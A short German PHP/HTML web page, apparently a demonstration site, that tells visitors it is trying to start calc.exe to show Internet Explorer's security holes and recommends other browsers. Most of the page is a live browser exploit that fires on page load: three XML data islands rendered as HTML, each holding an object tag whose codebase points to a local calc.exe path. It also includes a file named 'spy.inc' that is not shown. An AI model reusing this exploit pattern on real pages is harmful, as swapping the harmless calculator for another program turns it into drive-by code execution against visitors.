<?php
include("pageviews.inc");
include("spy.inc");
?>

<html><head>

<title>calc</title>
</head>

<body>
Starte calc.exe... FALLS der Aufruf gelingen sollte, was aber eher unwahrscheinlich ist, siehst du
welche Sicherheitsl&uuml;cken der IE hat. Nimm doch einfach Netscape oder Mozilla. :)<br><br>

<span datasrc="#oExec" datafld="exploit" dataformatas="html"></span>
<xml id="oExec">
        <security>
                <exploit>
                        <![CDATA[
                        <object id="oFile" classid="clsid:11111111-1111-1111-1111-111111111111" codebase=c:/windows/calc.exe></object>
                        ]]>
                </exploit>
        </security>
</xml>

<span datasrc="#oExec" datafld="exploit" dataformatas="html"></span>
<xml id="oExec">
        <security>
                <exploit>
                        <![CDATA[
                        <object id="oFile" classid="clsid:11111111-1111-1111-1111-111111111111" codebase=c:/windows/system32/calc.exe></object>
                        ]]>
                </exploit>
        </security>
</xml>

<span datasrc="#oExec" datafld="exploit" dataformatas="html"></span>
<xml id="oExec">
        <security>
                <exploit>
                        <![CDATA[
                        <object id="oFile" classid="clsid:11111111-1111-1111-1111-111111111111" codebase=c:/winnt/system32/calc.exe></object>
                        ]]>
                </exploit>
        </security>
</xml>

</body>
</html>
